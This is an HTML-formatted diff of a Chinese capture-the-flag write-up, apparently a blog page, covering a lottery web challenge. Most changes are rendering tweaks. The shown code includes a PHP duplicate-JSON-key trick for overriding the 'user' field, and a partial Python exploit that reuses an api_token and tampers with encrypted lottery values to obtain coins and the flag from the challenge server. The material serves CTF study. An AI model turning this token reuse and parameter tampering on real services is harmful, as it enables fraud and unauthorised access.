+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">LotteryController</span> <span class="k">extends</span> <span class="nx">BaseController</span>
 <span class="p">{</span>
     <span class="k">protected</span> <span class="nv">$price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
 
@@ -837,7 +837,7 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 <p>例：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -845,7 +845,7 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
     <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;22&#34;</span><span class="p">,</span>
     <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;33&#34;</span><span class="p">,</span>
@@ -857,7 +857,7 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 <p>exp(出现断连就把api_token拿出来继续用)</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -913,7 +913,7 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
 <span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">session</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
 <span class="kn">import</span> <span class="nn">string</span>
@@ -936,7 +936,7 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
     <span class="k">return</span> <span class="n">user</span>
 
 <span class="n">flag_user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">flag_user</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">flag_user</span><span class="p">)</span>
 <span class="n">price</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
     <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
 <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
@@ -961,12 +961,12 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
             <span class="s1">&#39;coin&#39;</span><span class="p">:</span> <span class="n">coin</span><span class="p">,</span>
             <span class="s1">&#39;enc&#39;</span><span class="p">:</span> <span class="n">treasure</span>
         <span class="p">})</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
 
 <span class="n">result</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/flag&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
     <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
 <span class="p">})</span><span class="o">.</span><span class="n">text</span>
-<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="oh-my-socket"><a href="#oh-my-socket" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:oh-my-socket" class="headings">oh-my-socket</a></h2>
